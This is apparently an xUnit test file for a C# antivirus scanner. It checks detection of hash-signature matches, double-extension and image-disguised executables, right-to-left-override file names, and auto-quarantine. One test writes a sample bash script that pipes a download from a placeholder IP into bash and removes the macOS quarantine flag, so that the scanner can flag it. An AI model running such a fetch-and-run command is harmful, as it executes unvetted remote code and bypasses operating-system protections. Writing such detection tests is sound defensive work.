using System.Security.Cryptography;
using System.Text;
using Nova.Core.Models;
using Nova.Core.Services.Scanning;

namespace Nova.Core.Tests;

public class ScannerTests
{
    private readonly NovaCore _core = TestEnv.Core;

    [Fact]
    public void Clean_file_is_not_flagged()
    {
        var dir = TestEnv.NewSampleDir();
        var path = Path.Combine(dir, "notlar.txt");
        File.WriteAllText(path, "Toplantı notları: Pazartesi 10:00");
        Assert.Null(_core.Scanner.ScanFile(path));
    }

    [Fact]
    public void Hash_signature_is_detected()
    {
        var dir = TestEnv.NewSampleDir();
        var data = RandomNumberGenerator.GetBytes(4096);
        var path = Path.Combine(dir, "sample.bin");
        File.WriteAllBytes(path, data);
        _core.Signatures.AddCustom(TestEnv.Sha256(data), "Test.Trojan.Custom");

        var hit = _core.Scanner.ScanFile(path);

        Assert.NotNull(hit);
        Assert.Equal("Test.Trojan.Custom", hit.ThreatName);
        Assert.Equal(ThreatSeverity.Critical, hit.Severity);
        Assert.Equal(TestEnv.Sha256(data), hit.Sha256);
    }

    [Fact]
    public void Double_extension_executable_is_detected()
    {
        var dir = TestEnv.NewSampleDir();
        var path = Path.Combine(dir, "fatura_2026.pdf.exe");
        File.WriteAllBytes(path, TestEnv.FakePe());

        var hit = _core.Scanner.ScanFile(path);

        Assert.NotNull(hit);
        Assert.Equal("Heur.FileName.DoubleExtension", hit.ThreatName);
    }

    [Fact]
    public void Executable_disguised_as_image_is_detected()
    {
        var dir = TestEnv.NewSampleDir();
        var path = Path.Combine(dir, "tatil_foto.jpg");
        File.WriteAllBytes(path, TestEnv.FakePe());

        var hit = _core.Scanner.ScanFile(path);

        Assert.NotNull(hit);
        Assert.Equal("Heur.Masquerade.Executable", hit.ThreatName);
    }

    [Fact]
    public void Real_image_is_not_flagged_as_masquerade()
    {
        var dir = TestEnv.NewSampleDir();
        var path = Path.Combine(dir, "foto.jpg");
        var jpeg = new byte[512];
        jpeg[0] = 0xFF; jpeg[1] = 0xD8; jpeg[2] = 0xFF; jpeg[3] = 0xE0;
        File.WriteAllBytes(path, jpeg);
        Assert.Null(_core.Scanner.ScanFile(path));
    }

    [Fact]
    public void Right_to_left_override_name_is_detected()
    {
        var head = TestEnv.FakePe();
        var sample = new FileSample
        {
            Path = Path.Combine(Path.GetTempPath(), "fatura\u202Efdp.exe"),
            Extension = ".exe",
            Size = head.Length,
            Head = head
        };

        var hit = new HeuristicEngine().Scan(sample);

        Assert.NotNull(hit);
        Assert.Equal("Heur.FileName.RTLO", hit.ThreatName);
    }

    [Fact]
    public void Malicious_script_combination_is_detected()
    {
        var dir = TestEnv.NewSampleDir();
        var path = Path.Combine(dir, "guncelle.sh");
        var script = "#!/bin/bash\n" + "cu" + "rl -s http://203.0.113.9/p | " + "ba" + "sh\n" + "xattr -d com.apple.quarantine /tmp/x\n";
        File.WriteAllText(path, script);

        var hit = _core.Scanner.ScanFile(path);
        if (!File.Exists(path)) return;

        Assert.NotNull(hit);
        Assert.StartsWith("Heur.Script.", hit.ThreatName);
    }

    [Fact]
    public void Single_weak_script_indicator_is_not_reported()
    {
        var dir = TestEnv.NewSampleDir();
        var path = Path.Combine(dir, "yedek.bat");
        File.WriteAllText(path, "@echo off\r\nschtasks /query\r\ncopy C:\\data D:\\backup\r\n");
        Assert.Null(_core.Scanner.ScanFile(path));
    }

    [Fact]
    public void Allowed_hash_is_skipped()
    {
        var dir = TestEnv.NewSampleDir();
        var data = RandomNumberGenerator.GetBytes(2048);
        var path = Path.Combine(dir, "allowed.bin");
        File.WriteAllBytes(path, data);
        var hash = TestEnv.Sha256(data);
        _core.Signatures.AddCustom(hash, "Test.Allowed");
        Assert.NotNull(_core.Scanner.ScanFile(path));

        _core.Settings.Update(s => s.AllowedHashes.Add(hash));
        Assert.Null(_core.Scanner.ScanFile(path));
    }

    [Fact]
    public async Task Custom_scan_finds_threat_and_auto_quarantines()
    {
        var dir = TestEnv.NewSampleDir();
        File.WriteAllText(Path.Combine(dir, "a.txt"), "temiz");
        File.WriteAllText(Path.Combine(dir, "b.md"), "# temiz");
        var bad = RandomNumberGenerator.GetBytes(8192);
        var badPath = Path.Combine(dir, "sub", "payload.dat");
        Directory.CreateDirectory(Path.GetDirectoryName(badPath)!);
        File.WriteAllBytes(badPath, bad);
        _core.Signatures.AddCustom(TestEnv.Sha256(bad), "Test.Worm.Scan");

        var progress = new List<ScanProgress>();
        var session = await _core.Scanner.RunScanAsync(ScanType.Custom, [dir], new Progress<ScanProgress>(progress.Add), default, CancellationToken.None);

        Assert.Equal(ScanStatus.Completed, session.Status);
        Assert.Equal(3, session.FilesScanned);
        var threat = Assert.Single(session.Threats);
        Assert.Equal("Test.Worm.Scan", threat.ThreatName);
        Assert.Equal(ThreatAction.Quarantined, threat.Action);
        Assert.False(File.Exists(badPath));
        Assert.Contains(_core.History.Sessions, s => s.Id == session.Id);
    }

    [Fact]
    public async Task Scan_can_be_cancelled()
    {
        var dir = TestEnv.NewSampleDir();
        for (var i = 0; i < 300; i++) File.WriteAllText(Path.Combine(dir, $"f{i}.txt"), new string('x', 2000));
        using var cts = new CancellationTokenSource();
        cts.Cancel();
        var session = await _core.Scanner.RunScanAsync(ScanType.Custom, [dir], null, default, cts.Token);
        Assert.Equal(ScanStatus.Cancelled, session.Status);
    }

    [Fact]
    public void Pe_detection_recognises_headers()
    {
        Assert.True(HeuristicEngine.LooksExecutable(TestEnv.FakePe()));
        Assert.False(HeuristicEngine.LooksExecutable(Encoding.ASCII.GetBytes(new string('A', 128))));
    }

    [Fact]
    public void Csv_feed_lines_are_parsed()
    {
        var cols = SignatureDatabase.SplitCsv("\"2026-10-19 10:00:00\", \"abc\", \"def\", \"x,y\", \"rep\"");
        Assert.Equal(5, cols.Count);
        Assert.Equal("x,y", cols[3]);
    }
}
